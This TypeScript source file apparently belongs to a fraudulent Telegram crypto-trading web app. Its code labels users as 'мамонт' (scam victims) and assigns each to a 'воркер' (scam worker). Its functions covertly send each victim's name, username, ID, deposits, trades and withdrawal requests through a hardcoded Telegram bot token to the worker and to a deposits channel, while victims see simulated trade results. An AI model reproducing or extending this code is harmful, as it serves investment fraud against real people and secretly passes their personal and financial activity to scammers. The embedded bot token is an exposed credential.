import { supabase } from '../supabaseClient';
import { getCurrentUserId } from './auth';

// Конфигурация бота для уведомлений
const BOT_TOKEN = '8312481233:AAH_CzfX314D_dbthhUBdZ5SoAzO3scrEu0';

/**
 * Отправляет уведомление рефереру (воркеру) о действии пользователя
 * @param actionName - название действия (например, "Пополнение", "Открытие сделки")
 * @param actionDetails - дополнительные детали действия
 */
export async function notifyReferrer(actionName: string, actionDetails?: {
    amount?: number;
    symbol?: string;
    currency?: string;
    method?: string;
}) {
    try {
        // 1. Получаем ID текущего пользователя (приоритет: Telegram WebApp > URL > localStorage)
        const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
        let userId = tgUser?.id;
        
        // Fallback 1: читаем tgid из URL
        if (!userId) {
            const urlParams = new URLSearchParams(window.location.search);
            const urlTgId = urlParams.get('tgid');
            if (urlTgId && !isNaN(Number(urlTgId))) {
                userId = Number(urlTgId);
            }
        }
        
        // Fallback 2: читаем из localStorage (для пользователей, вошедших через форму)
        if (!userId) {
            const storedUserId = getCurrentUserId();
            if (storedUserId) {
                userId = storedUserId;
                console.log('📱 Используем ID из localStorage:', userId);
            }
        }
        
        if (!userId) {
            console.log('❌ Не удалось получить ID пользователя для уведомления');
            return false;
        }

        // 2. Получаем данные пользователя и его реферера из Supabase
        const { data: userData, error: userError } = await supabase
            .from('users')
            .select('user_id, username, full_name, referrer_id')
            .eq('user_id', userId)
            .single();

        if (userError || !userData) {
            console.log('Пользователь не найден в базе данных');
            return false;
        }

        // 3. Проверяем, есть ли реферер
        if (!userData.referrer_id) {
            console.log('ℹ️ У пользователя нет реферера (воркера)');
            return false;
        }

        console.log(`📤 Отправка уведомления воркеру ${userData.referrer_id}...`);

        // 4. Получаем данные реферера (воркера)
        const { data: referrerData, error: referrerError } = await supabase
            .from('users')
            .select('user_id, username, full_name')
            .eq('user_id', userData.referrer_id)
            .single();

        if (referrerError || !referrerData) {
            console.log('Реферер не найден в базе данных');
            return false;
        }

        // 5. Формируем сообщение для воркера
        const userName = userData.full_name || 'Неизвестно';
        const userNickname = userData.username || 'Нет никнейма';
        
        let message = `🔔 <b>АКТИВНОСТЬ МАМОНТА</b>\n\n`;
        message += `👤 <b>Пользователь:</b> ${userName}\n`;
        message += `📱 <b>Никнейм:</b> ${userNickname}\n`;
        message += `🆔 <b>ID:</b> ${userData.user_id}\n\n`;
        message += `⚡️ <b>Действие:</b> ${actionName}\n`;

        // Добавляем детали действия если есть
        if (actionDetails) {
            if (actionDetails.amount) {
                message += `💰 <b>Сумма:</b> ${actionDetails.amount}`;
                if (actionDetails.currency) {
                    message += ` ${actionDetails.currency}`;
                }
                message += `\n`;
            }
            if (actionDetails.symbol) {
                message += `📊 <b>Актив:</b> ${actionDetails.symbol}\n`;
            }
            if (actionDetails.method) {
                message += `💳 <b>Метод:</b> ${actionDetails.method}\n`;
            }
        }

        message += `\n📅 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;

        // 6. Отправляем уведомление воркеру через Telegram Bot API
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: userData.referrer_id,
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (response.ok) {
            console.log(`✅ Уведомление успешно отправлено воркеру ${userData.referrer_id}`);
            return true;
        } else {
            const errorData = await response.json();
            console.error('❌ Ошибка отправки уведомления:', errorData);
            return false;
        }

    } catch (error) {
        console.error('❌ Ошибка в notifyReferrer:', error);
        return false;
    }
}

/**
 * Быстрые функции для конкретных действий
 */
export const notifyDeposit = (amount: number, currency: string, method: string) => {
    return notifyReferrer('Пополнение счета', { amount, currency, method });
};

export const notifyTrade = (symbol: string, amount: number) => {
    return notifyReferrer('Открытие сделки', { symbol, amount });
};

export const notifyWithdraw = (amount: number) => {
    return notifyReferrer('Запрос на вывод', { amount, currency: 'USD' });
};

export const notifyRegistration = () => {
    return notifyReferrer('Регистрация в системе');
};

/**
 * Отправляет уведомление в канал о пополнении с верификацией
 * @param amount - сумма пополнения
 * @param currency - валюта
 * @param method - метод пополнения
 * @param channelId - ID канала (например: @your_channel или -1001234567890)
 */
export async function notifyDepositToChannel(
    amount: number, 
    currency: string, 
    method: string,
    channelId: string = '@tontrader_deposits' // Замените на ваш канал
) {
    try {
        // Получаем ID текущего пользователя
        const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
        let userId = tgUser?.id;
        
        if (!userId) {
            const urlParams = new URLSearchParams(window.location.search);
            const urlTgId = urlParams.get('tgid');
            if (urlTgId && !isNaN(Number(urlTgId))) {
                userId = Number(urlTgId);
            }
        }
        
        if (!userId) {
            userId = getCurrentUserId();
        }
        
        if (!userId) {
            console.log('❌ Не удалось получить ID пользователя для уведомления в канал');
            return false;
        }

        // Получаем данные пользователя и воркера
        const { data: userData, error: userError } = await supabase
            .from('users')
            .select('user_id, username, full_name, referrer_id')
            .eq('user_id', userId)
            .single();

        if (userError || !userData) {
            console.log('❌ Пользователь не найден в базе данных');
            return false;
        }

        // Получаем данные воркера если есть
        let workerName = 'Без воркера';
        let workerNickname = '-';
        
        if (userData.referrer_id) {
            const { data: workerData } = await supabase
                .from('users')
                .select('username, full_name')
                .eq('user_id', userData.referrer_id)
                .single();
            
            if (workerData) {
                workerName = workerData.full_name || 'Неизвестно';
                workerNickname = workerData.username || '-';
            }
        }

        // Формируем сообщение для канала
        const userName = userData.full_name || 'Неизвестно';
        const userNickname = userData.username || 'Нет никнейма';
        
        const methodNames: Record<string, string> = {
            'card': '💳 Банковская карта',
            'crypto': '₿ Криптовалюта'
        };
        
        let message = `💰 <b>НОВОЕ ПОПОЛНЕНИЕ</b>\n\n`;
        message += `👤 <b>Мамонт:</b> ${userName}\n`;
        message += `📱 <b>Никнейм:</b> ${userNickname}\n`;
        message += `🆔 <b>ID:</b> ${userData.user_id}\n\n`;
        message += `👨‍💼 <b>Воркер:</b> ${workerName}\n`;
        message += `📱 <b>Никнейм воркера:</b> ${workerNickname}\n\n`;
        message += `💵 <b>Сумма:</b> ${amount} ${currency}\n`;
        message += `${methodNames[method] || method}\n\n`;
        message += `✅ <b>Статус:</b> Ожидает верификации\n`;
        message += `📅 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;

        // Отправляем в канал
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: channelId,
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (response.ok) {
            console.log(`✅ Уведомление о пополнении отправлено в канал`);
            return true;
        } else {
            const errorData = await response.json();
            console.error('❌ Ошибка отправки в канал:', errorData);
            return false;
        }

    } catch (error) {
        console.error('❌ Ошибка в notifyDepositToChannel:', error);
        return false;
    }
}

/**
 * Показывает браузерное push-уведомление о результате сделки
 */
export const showDealResultNotification = (
    symbol: string, 
    type: 'Long' | 'Short',
    pnl: number, 
    isWinning: boolean
) => {
    // Проверяем поддержку уведомлений
    if (!('Notification' in window)) {
        console.log('Браузер не поддерживает уведомления');
        return;
    }

    // Запрашиваем разрешение если нужно
    if (Notification.permission === 'default') {
        Notification.requestPermission();
    }

    if (Notification.permission === 'granted') {
        const title = isWinning ? '🎉 Сделка закрыта в плюс!' : '📉 Сделка закрыта в минус';
        const body = `${symbol} ${type}: ${isWinning ? '+' : ''}${pnl.toFixed(2)} USD`;
        const icon = isWinning 
            ? 'https://em-content.zobj.net/source/apple/391/money-bag_1f4b0.png'
            : 'https://em-content.zobj.net/source/apple/391/chart-decreasing_1f4c9.png';

        try {
            new Notification(title, {
                body,
                icon,
                badge: icon,
                tag: `deal-${Date.now()}`
            });
        } catch (e) {
            console.log('Ошибка показа уведомления:', e);
        }
    }

    // Также показываем через Telegram WebApp если доступно
    if (window.Telegram?.WebApp) {
        try {
            // Вибрация
            const haptic = (window.Telegram.WebApp as any).HapticFeedback;
            if (haptic) {
                if (isWinning) {
                    haptic.notificationOccurred('success');
                } else {
                    haptic.notificationOccurred('error');
                }
            }
            
            // Показываем popup
            const showPopup = (window.Telegram.WebApp as any).showPopup;
            if (showPopup) {
                showPopup({
                    title: isWinning ? '🎉 Победа!' : '📉 Убыток',
                    message: `${symbol} ${type}\n${isWinning ? '+' : ''}${pnl.toFixed(2)} USD`,
                    buttons: [{ type: 'ok' }]
                });
            }
        } catch (e) {
            console.log('Telegram WebApp notification error:', e);
        }
    }
};

/**
 * Уведомляет воркера о результате сделки мамонта
 */
export const notifyDealResult = (
    symbol: string,
    type: 'Long' | 'Short', 
    amount: number,
    pnl: number,
    isWinning: boolean
) => {
    const action = isWinning ? '✅ Выигрыш по сделке' : '❌ Проигрыш по сделке';
    return notifyReferrer(action, { 
        symbol, 
        amount,
        currency: `USD (${type}, PnL: ${isWinning ? '+' : ''}${pnl.toFixed(2)})`
    });
};
